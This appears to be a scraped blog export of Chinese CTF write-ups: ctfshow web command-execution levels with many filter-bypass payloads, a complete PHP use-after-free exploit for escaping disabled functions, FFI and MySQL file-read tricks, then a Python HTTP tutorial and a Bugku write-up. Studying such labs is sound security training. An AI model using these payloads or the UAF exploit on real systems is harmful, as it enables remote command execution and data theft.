34\n\n```\npayload:?c=include%09$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\n题目过滤了flag,system,php,cat,sort,shell,小数点,空格,单引号,波浪号,echo,分号,括号,双引号,冒号，同上\n\n##### 35\n\n```\npayload:?c=include%09$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\n题目过滤了flag,system,php,cat,sort,shell,小数点,空格,单引号,波浪号,echo,分号,括号,双引号,冒号,左尖括号,等于号，同上\n\n##### 36\n\n```\npayload:?c=include%09$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\n题目过滤了flag,system,php,cat,sort,shell,小数点,空格,单引号,波浪号,echo,分号,括号,双引号,冒号,左尖括号,等于号,数字，将get参数中的数字改为字母即可\n\n##### 37\n\n```\npayload:?c=php://input\n请求体:<?php include \"flag.php\"?>\n或\npayload:?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==\n```\n\ninclude函数开始，过滤了flag，通过php://input伪协议直接包含文件\n\n##### 38\n\n```\npayload:?c=data://text/plain;base64,PD9waHAgaW5jbHVkZSAiZmxhZy5waHAiPz4=\n```\n\n过滤了flag, php,file，通过data伪协议执行include \"flag.php\"\n\n##### 39\n\n```\npayload:?c=data://text/plain,<?php system(\"cat fla*.php\");?>\n```\n\n过滤了flag并且包含的是变量c.php，输入后相当于直接执行输入的PHP命令，由于前面的PHP内容已经闭合，所以后面的.php直接就是.php文本显示，对前面的命令输入没有影响\n\n##### 40\n\n```\npayload:?c=eval(array_pop(next(get_defined_vars())));\n\nPOST:a=system('cat flag.php');\n```\n\nprint_r(get_defined_vars());可以拿到所有已经定义的变量并取得值\n\nnext(变量)可以获得下一个变量\n\narray_pop(数组)弹出数组中的变量为单个独立变量\n\n```\nc=session_start();system(session_id());\npassid=ls\n```\n\n本地修改sessionID传入命令\n\n##### 41\n\n```\n\n```\n\n```\n'/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\&|\\-/i'\n```\n\n可以发现大多数自负都被过滤，查看提示\n\n通过脚本可获取异或（｜）后能得到的所有字符\n\n直接使用脚本\n\n##### 42\n\n```\npayload:?c=cat flag.php;\n```\n\n$c.\" >/dev/null 2>&1\"\n\n题目中将命令输出保存到黑洞中，可通过分号分割命令让第一个执行的命令直接显示\n\n##### 43\n\n```\npayload:?c=tac%20flag.php%26%26\n```\n\n同上题，过滤了cat和分号，通过&&也可进行多命令执行，要进行URL编码\n\n##### 44\n\n```\npayload:?c=tac%20fla*.php%26%26\n```\n\n同上题，过滤了flag，使用通配符\n\n##### 45\n\n```\npayload:?c=tac${IFS}fla*.php%26%26\n```\n\n同上题，过滤了空格，找个能替代的就行\n\n##### 46\n\n```\npayload:?c=tac%09fla?.php%26%26\n```\n\n同上题，过滤了*和$，使用%09（制表符）替代空格\n\n##### 47\n\n```\npayload:?c=tac%09fla?.php%26%26\n```\n\n同上题，过滤了一些读取文件的命令，但没滤tac，直接用\n\n##### 48\n\n```\npayload:?c=tac<fl%27%27ag.php%26%26\n```\n\n同上题，过滤了数字和空格\n\n##### 49\n\n```\npayload:?c=tac<fl%27%27ag.php||\n```\n\n同上题，过滤了水平制表符和&&符，将&更换为｜也可以多命令执行\n\n##### 50\n\n```\npayload:?c=tac<fl%27%27ag.php||\n```\n\n##### 51\n\n```\npayload:?c=nl<fla%27%27g.php||\n```\n\n滤了tac呜呜呜呜用nl\n\n##### 52\n\n```\npayload:?c=nl${IFS}/fl%27%27ag||\n```\n\n滤掉了尖括号但是$回来了\n\n`nl${IFS}fla%27%27g.php||`\n\n但是明显flag不对，所以看一下根目录`ls${IFS}/`发现flag存在\n\n使用nl读取\n\n##### 53\n\n```\npayload:?c=ta%27%27c${IFS}fla?.php\n```\n\n该题内容不同\n\n```\necho($c);\n$d = system($c);\necho \"<br>\".$d;\n```\n\n先将命令打印并执行后获得system函数的返回值并输出，system函数只返回命令执行后输出的最后一行，使用tac\n\n##### 54\n\n```\npayload:c=mv${IFS}fla?.php${IFS}kkk.txt\n/kkk.txt\n```\n\n过滤了单引号绕过，通过mv命令重命名直接读取\n\n##### 55\n\n过滤`\"/\\;|[a-z]|\\`|\\%|\\x09|\\x26|\\>|\\</i\"\n\n**无字母数字的命令执行**\n\n直接讲原理咯\n\n.（点）或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则“.file”的意思就是用bash执行file文件中的命令。用“.file”执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用“.”来执行它了吗？\n\n咋执行呢，原理是当我们发送一个上传文件的POST包时，这个文件会被储存在临时目录中，默认的文件是`/tmp/phpXXXXXX`(六个随机字符)，那么我们就可以用通配符（?单匹配和*多匹配）来尝试执行我们上传的文件，但是尝试执行后发现不行，我们自己搭建一个php环境看一下为什么\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/ming1.png)\n\n列出相关的文件后发现是因为符合匹配条件的文件数量不止一个，就导致还没运行到我们上传的脚本时就已经结束了，所以我们要尝试用其他的通配符匹配出我们需要的文件，查看相关资料，Linux的glob通配符的相关内容（贴个链接）\n\nhttps://man7.org/linux/man-pages/man7/glob.7.html\n\n除了使用?和*进行任意匹配，还可以使用`[^X]`来排除某个字符，这样我们就可以排除前面包含`-`和`.`文件，继续查看发现还剩下三个文件，而后发现还有一个通配符语法`[X-Y]`可以表示一个范围，而且只有php临时文件中包含大写字母，查询ascii码表发现大写字母位于`@`和`[`之间，所以构造`[@-[]`就可以匹配到我们的文件了\n\n最终payload\n\n首先构建一个上传文件的html\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>POST数据包POC</title>\n</head>\n<body>\n<form action=\"当前链接/?c=./???/????????[@-[]\" method=\"post\" enctype=\"multipart/form-data\">\n    <label for=\"file\">文件名：</label>\n    <input type=\"file\" name=\"file\" id=\"file\"><br>\n    <input type=\"submit\" name=\"submit\" value=\"提交\">\n</form>\n</body>\n</html>\n```\n\n第一个文件内容\n\n```shell\nls\n然后\ncat /var/www/html/flag.php\n```\n\n如果一次不成功就repeater多试几次\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/ming2.png)\n\n拿到flag\n\n##### 57\n\n```\npayload:?c=$((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))\n```\n\n[a-z]|[0-9]|\\`|\\|\\#|\\'|\\\"|\\`|\\%|\\x09|\\x26|\\x0a|\\>|\\<|\\.|\\,|\\?|\\*|\\-|\\=|\\[/i\n\n过滤了大量字符，最终需要构建36即可，没有过滤`$`，而在Linux中$是变量的关键字，所以我们可以使用变量\n\n```\n$(())这个变量中的()代表数学运算，结果为0，所以\necho $(())\n0\n对这个变量进行取反操作结果为\necho ~$(())\n~0\n那么我们再对~0进行数学运算得到的结果就是\necho $((~$(())))\n~1\n所以我们想得到36就是让36个~1相加再取反\necho $((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))\n```\n\n##### 58\n\n```\npayload:\nPOST\nc=file_get_contents('flag.php')\n```\n\n命令执行，突破禁用函数\n\n首先尝试system发现被过滤了，emmmm尝试过后发现能执行系统命令的全被禁用了\n\n那么尝试能否读取文件，使用file_get_contents读取成功，提示中也显示show_source同样可用\n\n##### 59\n\n```\npayload:\nPOST\nc=show_source('flag.php')\n```\n\n能执行系统命令的就别试了，全挂了\n\nshow_source可用\n\n还可尝试通过include来包含文件，再通过PHP伪协议进行读取\n\n```\npayload:?file=php://filter/read=convert.base64-encode/resource=flag.php\nPOST\nc=include($_GET['flie']);\n```\n\n##### 60\n\n```\npayload:\nPOST\nc=highlight_file('flag.php');\n```\n\n上一题可用的方法也可\n\n##### 61\n\n同上\n\n##### 62\n\n```\npayload:\nPOST\nc=include('flag.php');echo $flag;\n```\n\n上面所有方法皆可\n\n##### 63\n\n```\npayload:\nPOST\nc=include('flag.php');var_dump(get_defined_vars());\n```\n\n`get_defined_vars()`可获得所有已定义的变量，当不知道变量名时可使用这个\n\n上面方法同样🉑️\n\n##### 64\n\n```\npayload:\nPOST\nc=include('flag.php');echo $flag;\n```\n\n`scandir('.')`可用于扫描文件，和ls一个意思，当我们不知道文件名时可使用\n\n##### 65\n\n同上\n\n##### 66\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-03-19 17.49.25.png)\n\n尝试失败还被嘲讽了，首先扫描一下文件，发现根目录下有flag.txt，`highlight_file('/flag.txt')`读取即可\n\n```\npayload:\nPOST\nc=highlight_file('/flag.txt');\n```\n\n##### 67\n\n同上\n\n##### 68\n\n```\npayload:\nPOST\nc=include('/flag.txt')\n```\n\n属于是离谱了，直接封了`highlight_file`函数，`var_dump(scandir('/'))`，发现在根目录中，直接include文件，没有php标签即为直接显示源码，等于直接显示flag.txt的内容\n\n##### 69\n\n同上\n\n##### 70\n\n继续白嫖\n\n##### 71\n\n```\npayload:\nPOST\nc=include('/flag.txt');exit();\n```\n\n尝试白嫖发现失败，下载源码进行查看，发现在输出之前将缓冲区中的所有数字字母换成了问号，那么我们让它包含完直接退出就行了\n\n##### 72\n\n文件换位置了哭哭，scandir找不到根目录，var_dump也没了，哭哭\n\n看提示\n\n首先找出文件名\n\n```PHP\npayload:\nPOST\nc=$a=new DirectoryIterator(\"glob:///*\");\nforeach($a as $f)\n{echo($f->__toString().' ');\n} exit(0);\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-03-19 23.52.16.png)uaf脚本如下\n\n```PHP\n<?php\nfunction ctfshow($cmd) {\n    global $abc, $helper, $backtrace;\n\n    class Vuln {\n        public $a;\n        public function __destruct() { \n            global $backtrace; \n            unset($this->a);\n            $backtrace = (new Exception)->getTrace();\n            if(!isset($backtrace[1]['args'])) {\n                $backtrace = debug_backtrace();\n            }\n        }\n    }\n\n    class Helper {\n        public $a, $b, $c, $d;\n    }\n\n    function str2ptr(&$str, $p = 0, $s = 8) {\n        $address = 0;\n        for($j = $s-1; $j >= 0; $j--) {\n            $address <<= 8;\n            $address |= ord($str[$p+$j]);\n        }\n        return $address;\n    }\n\n    function ptr2str($ptr, $m = 8) {\n        $out = \"\";\n        for ($i=0; $i < $m; $i++) {\n            $out .= sprintf(\"%c\",($ptr & 0xff));\n            $ptr >>= 8;\n        }\n        return $out;\n    }\n\n    function write(&$str, $p, $v, $n = 8) {\n        $i = 0;\n        for($i = 0; $i < $n; $i++) {\n            $str[$p + $i] = sprintf(\"%c\",($v & 0xff));\n            $v >>= 8;\n        }\n    }\n\n    function leak($addr, $p = 0, $s = 8) {\n        global $abc, $helper;\n        write($abc, 0x68, $addr + $p - 0x10);\n        $leak = strlen($helper->a);\n        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }\n        return $leak;\n    }\n\n    function parse_elf($base) {\n        $e_type = leak($base, 0x10, 2);\n\n        $e_phoff = leak($base, 0x20);\n        $e_phentsize = leak($base, 0x36, 2);\n        $e_phnum = leak($base, 0x38, 2);\n\n        for($i = 0; $i < $e_phnum; $i++) {\n            $header = $base + $e_phoff + $i * $e_phentsize;\n            $p_type  = leak($header, 0, 4);\n            $p_flags = leak($header, 4, 4);\n            $p_vaddr = leak($header, 0x10);\n            $p_memsz = leak($header, 0x28);\n\n            if($p_type == 1 && $p_flags == 6) { \n\n                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;\n                $data_size = $p_memsz;\n            } else if($p_type == 1 && $p_flags == 5) { \n                $text_size = $p_memsz;\n            }\n        }\n\n        if(!$data_addr || !$text_size || !$data_size)\n            return false;\n\n        return [$data_addr, $text_size, $data_size];\n    }\n\n    function get_basic_funcs($base, $elf) {\n        list($data_addr, $text_size, $data_size) = $elf;\n        for($i = 0; $i < $data_size / 8; $i++) {\n            $leak = leak($data_addr, $i * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                \n                if($deref != 0x746e6174736e6f63)\n                    continue;\n            } else continue;\n\n            $leak = leak($data_addr, ($i + 4) * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                \n                if($deref != 0x786568326e6962)\n                    continue;\n            } else continue;\n\n            return $data_addr + $i * 8;\n        }\n    }\n\n    function get_binary_base($binary_leak) {\n        $base = 0;\n        $start = $binary_leak & 0xfffffffffffff000;\n        for($i = 0; $i < 0x1000; $i++) {\n            $addr = $start - 0x1000 * $i;\n            $leak = leak($addr, 0, 7);\n            if($leak == 0x10102464c457f) {\n                return $addr;\n            }\n        }\n    }\n\n    function get_system($basic_funcs) {\n        $addr = $basic_funcs;\n        do {\n            $f_entry = leak($addr);\n            $f_name = leak($f_entry, 0, 6);\n\n            if($f_name == 0x6d6574737973) {\n                return leak($addr + 8);\n            }\n            $addr += 0x20;\n        } while($f_entry != 0);\n        return false;\n    }\n\n    function trigger_uaf($arg) {\n\n        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');\n        $vuln = new Vuln();\n        $vuln->a = $arg;\n    }\n\n    if(stristr(PHP_OS, 'WIN')) {\n        die('This PoC is for *nix systems only.');\n    }\n\n    $n_alloc = 10; \n    $contiguous = [];\n    for($i = 0; $i < $n_alloc; $i++)\n        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');\n\n    trigger_uaf('x');\n    $abc = $backtrace[1]['args'][0];\n\n    $helper = new Helper;\n    $helper->b = function ($x) { };\n\n    if(strlen($abc) == 79 || strlen($abc) == 0) {\n        die(\"UAF failed\");\n    }\n\n    $closure_handlers = str2ptr($abc, 0);\n    $php_heap = str2ptr($abc, 0x58);\n    $abc_addr = $php_heap - 0xc8;\n\n    write($abc, 0x60, 2);\n    write($abc, 0x70, 6);\n\n    write($abc, 0x10, $abc_addr + 0x60);\n    write($abc, 0x18, 0xa);\n\n    $closure_obj = str2ptr($abc, 0x20);\n\n    $binary_leak = leak($closure_handlers, 8);\n    if(!($base = get_binary_base($binary_leak))) {\n        die(\"Couldn't determine binary base address\");\n    }\n\n    if(!($elf = parse_elf($base))) {\n        die(\"Couldn't parse ELF header\");\n    }\n\n    if(!($basic_funcs = get_basic_funcs($base, $elf))) {\n        die(\"Couldn't get basic_functions address\");\n    }\n\n    if(!($zif_system = get_system($basic_funcs))) {\n        die(\"Couldn't get zif_system address\");\n    }\n\n\n    $fake_obj_offset = 0xd0;\n    for($i = 0; $i < 0x110; $i += 8) {\n        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));\n    }\n\n    write($abc, 0x20, $abc_addr + $fake_obj_offset);\n    write($abc, 0xd0 + 0x38, 1, 4); \n    write($abc, 0xd0 + 0x68, $zif_system); \n\n    ($helper->b)($cmd);\n    exit();\n}\n\nctfshow(\"cat /flag0.txt\");ob_end_flush();\n?>\n\n```\n\n最终\n\n```\npayload:\nPOST\nc=上面的代码\n```\n\n##### 73\n\n同上，文件名更改为flagc\n\n##### 74\n\n```\npayload:\nPOST\nc=include('/flagx.txt');exit();\n```\n\n首先扫目录，同上题payload，而后发现在根目录有flagx.txt尝试包含成功\n\n##### 75\n\nban掉了open_basedir访问文件的方式，只能通过别的方法来访问文件，可以通过mysql访问，在前面几题中可以找到mysql的账号密码，最终payload如下\n\n```PHP\npayload:\nPOST\nc=try {\n  $dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root','root');\n  foreach($dbh->query('select load_file(\"/flag36.txt\")') as $row)\n\t{\n    echo($row[0]); \n  }\n  $dbh = null;\n}\ncatch (PDOException $e) \n{\n  echo $e->getMessage();\n  exit(0);\n}\nexit(0);\n```\n\n拓展PDO知识：\n\n```PHP\nPHP 数据对象 （PDO） 扩展为PHP访问数据库定义了一个轻量级的一致接口。\nPDO 提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。\nPDO随PHP5.1发行，在PHP5.0的PECL扩展中也可以使用，无法运行于之前的PHP版本。\n一个实例\n<?php\n$dbms='mysql';     //数据库类型\n$host='localhost'; //数据库主机名\n$dbName='test';    //使用的数据库\n$user='root';      //数据库连接用户名\n$pass='';          //对应的密码\n$dsn=\"$dbms:host=$host;dbname=$dbName\";\n\ntry {\n    $dbh = new PDO($dsn, $user, $pass); //初始化一个PDO对象\n    echo \"连接成功<br/>\";\n    /*你还可以进行一次搜索操作\n    foreach ($dbh->query('SELECT * from FOO') as $row) {\n        print_r($row); //你可以用 echo($GLOBAL); 来看到这些值\n    }\n    */\n    $dbh = null;\n} catch (PDOException $e) {\n    die (\"Error!: \" . $e->getMessage() . \"<br/>\");\n}\n//默认这个不是长连接，如果需要数据库长连接，需要最后加一个参数：array(PDO::ATTR_PERSISTENT => true) 变成这样：\n$db = new PDO($dsn, $user, $pass, array(PDO::ATTR_PERSISTENT => true));\n\n?>\n```\n\n##### 76\n\n同上改名字\n\n##### 77\n\n首先还是扫目录，文件名flag36x.txt，尝试上题方法发现数据库消失，看提示是PHP7.4以上的新特性，可以通过新建一个FFI对象来执行系统命令，又因为执行系统命令后没有回显，所以我们把执行后的结果放到网站目录下的一个文本文件中进行读取\n\n```php\npayload:\nPOST\nc=$ffi = FFI::cdef(\"int system(const char *command);\");\n$a='/readflag > /var/www/html/1.txt';\n$ffi->system($a);\n```\n\n然后访问/1.txt即可\n\n##### 118\n\n首先查看源码，发现输入被包含到system函数中执行，尝试`echo，whoami，ls，cat`全部失效想方法绕过，输入空格发现可以执行，所以可以尝试通过构造系统变量来执行，查看提示的图片\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-03-21 16.39.03.png)\n\n发现是默认配置文件下的文件名列表，可以通过剪裁构造变量，读取文件命令最容易进行构造的就是`nl`，想拼接出nl只需要取系统配置变量最后一位n和当前执行目录最后一位l即可，最终payload如下\n\n```\npayload:${PATH:~0}${PWD:~0}$IFS????.???\n```\n\n发现还是不行，是因为过滤了数字，没关系，剪裁字符还可通过大写字母解决，真·最终payload如下\n\n```\npayload:${PATH:~A}${PWD:~A}$IFS????.???\n```\n\n**系统变量补充知识**\n\n```\n$PATH 系统配置变量\n$PWD 当前执行目录\n$HOME 默认进入的目录\n$SHELL\n$USER 当前user\n$SHLVL 代表当前shell窗口的深度，一般为1\n$PHP_CFLAGS 指定头文件（.h文件）的路径，如：CFLAGS=-I/usr/include -I/path/include。同样地，安装一个包时会在安装路径下建立一个include目录，当安装过程中出现问题时，试着把以前安装的包的include目录加入到该变量中来。\n$PHP_VERSION PHP版本\n\n```\n\n**Linux变量补充知识**\n\n```\n${变量名:从哪一位开始取:取多长}，如没有长度默认取到最后，如果没有起始位就从头开始\n${#变量名}，代表这个变量的长度\n$\n```\n\n##### 119\n\n先尝试上一把的是否可行，不行所以直接看提示吧，系统变量的知识补充在上一道题了，针对本题\n\n```\nSHLVL的值为2，#SHLVL的值为1，从PHP_VERSION的第二位取一个为3，也就是${PHP_VERSION:${SHLVL}:${#SHLVL}}为3，最终取\nPHP_CFLAGS变量从第三位开始的前三个即可构造tac\n```\n\n最终payload如下\n\n```\npayload:${PHP_CFLAGS:${PHP_VERSION:${SHLVL}:${#SHLVL}}:${PHP_VERSION:${SHLVL}:${#SHLVL}}} ????.???\n```\n\n##### 120\n\n上一把的字符太长了，只能通过别的命令读取了\n\n```\ntips：Linux中的base64在/bin目录之下，base64 文件名即可将文件进行base64编码\n```\n\n所以我们最终构造出结果为/bin/base64 flag.php即可\n\n首先是/字符，PWD首位，而后bin可使用通配符，尝试base64也使用通配符不可行，所以我们尝试构建出数字4来匹配\n\n```\ntips：RANDOM变量能生成一万以内的随机数，用#取长度即可有概率得到4\n```\n\n最终payload\n\n```\npayload:\nPOST\ncode=${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???\n```\n\n~~多刷新几次总会出来的~~\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-03-21 19.36.51.png)\n\n##### 121\n\n尝试上题payload，发现SHLVL被过滤了，所以我们需要一个1\n\n```\ntips:通过$?来实现的，$?是表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误\n```\n\n所以我们使用${#?}即可构造出1，最终payload如下\n\n```\npayload:\nPOST\ncode=AAAAAAAAA\ncode=${PWD::${#?}}???${PWD::${#?}}?????${#RANDOM} ????.???\n```\n\n##### 122\n\n滤了PWD但是有HOME，HOME替换PWD就行，滤了#号没发去长度，RANDOM取一位即可，随机到了就是胜利\n\n```\npayload:\nPOST\ncode=A;${PWD::${?}}???${PWD::${?}}?????${RANDOM} ????.???\n```\n\n","tags":["CTF","web"]},{"title":"Python于web层应用","url":"/posts/4256.html","content":"\n# Python于web层应用\n\n## HTTP协议基础\n\n### 协议分类\n\nHTTP 1.0 80端口 单次一个链接\n\nHTTP 1.1 80端口 多次可一个链接\n\nHTTP协议不够安全，进而发展出了HTTPS协议\n\nHTTPS 443端口 加密后数据传输\n\n<!--more-->\n\n### 请求方法\n\n###### HTTP 1.0\n\nGET POST HEAD\n\n###### HTTP 1.1与HTTPS\n\nOPTIONS PUT DELETE TRACE CONNECT PATCH\n\n### URL格式\n\n协议://主机名.域名/文件夹/文件?参数=值&参数=值\n\n### HTTP请求头\n\nUser-Agent：浏览器版本信息\n\nAccept-encoding：浏览器接受的编码\n\nReferer：当前网页跳转来源\n\nCookie：顾名思义，~~好吃的饼干，~~Cookie信息\n\nLocation：跳转到哪里\n\nSet-Cookie：设置Cookie信息\n\nWWW-Authenticate：用于身份验证HTTP Basic等\n\n### HTTP响应状态码\n\n1XX：信息提示\n\n2XX：成功\n\n3XX：重定向\n\n4XX：客户端错误\n\n5XX：服务端错误\n\n### 查看HTTP\n\n使用浏览器审查进行查看\n\n使用Burpsuite截断查看\n\n## Python使用HTTP请求\n\n###### GET请求\n\n不带参数`requests.get(url)`\n\n带参数`requests.get(url=url,params={\"key1\":\"value1\",\"key2\":\"value2\"})`\n\n返回的对象r.url获取url\n\n###### POST请求\n\n不带参数`requests.post(url)`\n\n带参数`requests.post(url=url,data={\"key1\":\"value1\",\"key2\":\"value2\"})`\n\n###### 自定义请求头\n\nheaders={key1:value1,key2:value2}\n\nrequests.get(url=url,headers=headers)\n\n###### 其他请求\n\nrequests.put(url,data)\n\nrequests.delete(url)\n\nrequests.head(url)\n\nrequests.options(url)\n\n## Python处理HTTP响应\n\n**获取相应状态码：**r.status_code\n\n**获取响应文本：**r.content（获取到二进制内容）r.text（获取原始文本代码）\n\n**获取相应头：**r.headers\n\n**获取请求头：**r.reuqests.headers\n\n**获取请求URL：**r.url\n\n**获取Cookie：**r.cookies\n\n## Python设置HTTP代理\n\n**代理设置：**http和https:`proxies={'http':'http://代理服务器:代理端口','https':'https://代理服务器:代理端口'}`\n\n**参数设置：**`proxies=proxies,verfiy=False`\n\n## Python会话编程\n\n通过Set-Cookie设置一个cookie值\n\n使用`s=requesets.Session()`建立一个新的空会话\n\n`r=s.get(url)`来在会话中发起个体请求\n\n## Python制作目录扫描工具\n\n###### 目录扫描原理\n\n1、读取字典文件拼接URL\n\n2、通过get请求访问URL\n\n3、获取状态码判断目录是否存在\n\n###### 字典文件读取\n\n1、`with open(\"filename.txt\",\"r\") as f:`\n\n2、读取方式：\n\n- `f.readline()//读取一行`\n- `f.readlines()//逐行读取到一个列表中`\n- `f.read(字节数)//按字节读`\n- `line.strip()//去除空行`\n\n3、`f.close()`关闭文件流\n\n4、sys库中的sys.argv[0]为当前python文件绝对路径，sys.argv[1]为传入第一个参数\n\n5、User-Agent通过抓包先获取真实的User-Agent，再通过headers字典传入get请求\n\n## IIS PUT漏洞\n\nIIS中拓展工具WebDAV支持HTTP方法，也提供了一些其他功能强大的方法（Move），使得开启WebDAV可以直接上传任意文件\n\n**探测方法：**通过HTTP中options方法可以探测出服务器支持的HTTP方法\n\n**探测过程：**\n\n- 确定目标主机\n- 使用HTTP options方法探测\n- 查看返回结果中是否存在MOVE PUT\n- 查看响应头中的PUBLIC属性\n\n## 探测服务器信息\n\n相应头中的Server：服务器中间件属性\n\nX-Powered-By：服务器脚本技术\n\n## Python制作漏洞检测工具\n\n首先了解漏洞产生原理，根据漏洞原理写出对应的POC代码来验证漏洞是否存在\n\n## 构建站点地图\n\n测试Web App的首要任务就是获取站点完整的目录和文件\n\n###### 技术种类：建议使用两种方式同时进行\n\n1、通过基于字典的目录文件扫描\n\n2、通过基于网络爬虫的技术（可通过requests库构建，但是很复杂，有scrapy库可用于构建爬虫）\n\n3、通过Burpsuite构建网站地图\n","tags":["web"]},{"title":"Bugku never_give_up","url":"/posts/37725.html","content":"\n# Bugku never_give_up\n\n查看源代码好的提示访问1p.html\n\n```html\n<HTML>\n<HEAD>\n    <SCRIPT LANGUAGE=\"Javascript\">\n    //\n\n\n    var Words = \"%3Cscript%3Ewindow.location.href%3D'http%3A%2F%2Fwww.bugku.com'%3B%3C%2Fscript%3E%20%0A%3C!--JTIyJTNCaWYoISUyNF9HRVQlNUInaWQnJTVEKSUwQSU3QiUwQSUwOWhlYWRlcignTG9jYXRpb24lM0ElMjBoZWxsby5waHAlM0ZpZCUzRDEnKSUzQiUwQSUwOWV4aXQoKSUzQiUwQSU3RCUwQSUyNGlkJTNEJTI0X0dFVCU1QidpZCclNUQlM0IlMEElMjRhJTNEJTI0X0dFVCU1QidhJyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJ2InJTVEJTNCJTBBaWYoc3RyaXBvcyglMjRhJTJDJy4nKSklMEElN0IlMEElMDllY2hvJTIwJ25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJyUzQiUwQSUwOXJldHVybiUyMCUzQiUwQSU3RCUwQSUyNGRhdGElMjAlM0QlMjAlNDBmaWxlX2dldF9jb250ZW50cyglMjRhJTJDJ3InKSUzQiUwQWlmKCUyNGRhdGElM0QlM0QlMjJidWdrdSUyMGlzJTIwYSUyMG5pY2UlMjBwbGF0ZWZvcm0hJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuKCUyNGIpJTNFNSUyMGFuZCUyMGVyZWdpKCUyMjExMSUyMi5zdWJzdHIoJTI0YiUyQzAlMkMxKSUyQyUyMjExMTQlMjIpJTIwYW5kJTIwc3Vic3RyKCUyNGIlMkMwJTJDMSkhJTNENCklMEElN0IlMEElMDklMjRmbGFnJTIwJTNEJTIwJTIyZmxhZyU3QioqKioqKioqKioqJTdEJTIyJTBBJTdEJTBBZWxzZSUwQSU3QiUwQSUwOXByaW50JTIwJTIybmV2ZXIlMjBuZXZlciUyMG5ldmVyJTIwZ2l2ZSUyMHVwJTIwISEhJTIyJTNCJTBBJTdEJTBBJTBBJTBBJTNGJTNF--%3E\"\n    function OutWord()\n    {\n        var NewWords;\n        NewWords = unescape(Words);\n        document.write(NewWords);\n    }\n    OutWord();\n    // -->\n    </script>\n</HEAD>\n<BODY></BODY>\n</HTML>\n\n\n```\n\n<!--more-->\n\n查看函数得知是将`Words`中的内容解码后执行\n\n经过URL解码与base64解码后hello.php的代码如下\n\n```php+HTML\n<script>window.location.href='http://www.bugku.com';</script> \n<!--\";if(!$_GET['id'])\n{\n\theader('Location: hello.php?id=1');\n\texit();\n}\n$id=$_GET['id'];\n$a=$_GET['a'];\n$b=$_GET['b'];\nif(stripos($a,'.'))\n{\n\techo 'no no no no no no no';\n\treturn ;\n}\n$data = @file_get_contents($a,'r');\nif($data==\"bugku is a nice plateform!\" and $id==0 and strlen($b)>5 and eregi(\"111\".substr($b,0,1),\"1114\") and substr($b,0,1)!=4)\n{\n\t$flag = \"flag{***********}\"\n}\nelse\n{\n\tprint \"never never never give up !!!\";\n}\n?>-->\n```\n\n主要判断语句为：\n\n```php\nif($data==\"bugku is a nice plateform!\" and $id==0 and strlen($b)>5 and eregi(\"111\".substr($b,0,1),\"1114\") and substr($b,0,1)!=4)\n```\n\ndata的数据来自file_get_contents函数，可以通过php伪协议中的php://input来伪造\n\nid==0为弱相等，而由于前面判断id所以id不能直接等于0，可以让id=%00，.，0e1，字母字符等绕过\n\nb长度大于5并且首位不为4，并且\"1114\"字符串中存在符合\"111\".substr($b,0,1)该规则的内容\n\n查询正则表达式的特殊字符得知，正则中的特殊字符如下\n\n|      | 特殊字符                                             |\n| ---- | ---------------------------------------------------- |\n| +    